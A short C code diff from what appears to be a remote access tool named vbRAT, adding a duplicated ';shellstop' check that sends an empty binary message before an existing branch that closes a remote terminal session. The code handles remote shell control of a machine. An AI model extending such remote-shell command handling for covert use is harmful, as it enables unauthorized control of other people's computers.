@@ -61,6 +61,10 @@ void vbRAT_messageReceived(const char* buf, int len)
     {
         if(strcmp(buf, ";shellstop")==0)
         {
+            vbConnection_SendBinary("");
+        }
+        if(strcmp(buf, ";shellstop")==0)
+        {
             vbTTY_stopShell();
             vbConnection_Send("~Terminal session closed.");
         }
